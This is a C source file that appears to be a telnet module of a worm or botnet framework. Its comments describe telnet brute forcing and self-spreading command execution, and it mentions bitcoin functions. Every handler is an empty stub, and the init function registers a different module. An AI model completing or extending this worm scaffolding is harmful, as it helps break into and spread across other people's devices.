/*
telnet brute forcing, and command execution (spreading worm)

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include "../../list.h"
#include "../../structs.h"
#include "../../utils.h"
#include "telnet.h"


int telnet_init(Modules **);



ModuleFuncs telnet_funcs = { 
    &telnet_read,
    &telnet_write,
    &telnet_incoming,
    &telnet_outgoing,
    &telnet_nodes,
    //&telnet_main_loop,
    NULL
};

Modules CC_Telnet = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    23, 0,
    // required 0, 0..  
    0, 0,
    //timer = 300 seconds (5min) - get new nodes, etc
    // we will run this every 5 seconds since we are a WORM
    5,
    // bitcoin functions
    &telnet_funcs, NULL
};


// initialize the module
int telnet_init(Modules **_module_list) {
    Module_Add(_module_list, &CC_Bitcoin);
}


int telnet_read(Modules *mptr, Connection *cptr, char **_buf, int *_size) {
    return 0;
}
int telnet_write(Modules *mptr, Connection *cptr, char **_buf, int *_size) {
    
}
int telnet_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}
int telnet_outgoing(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}
int telnet_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}
int telnet_nodes(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}
int telnet_connect(Modules *mptr, Connection **_conn_list, uint32_t ip, int port) {
    
}
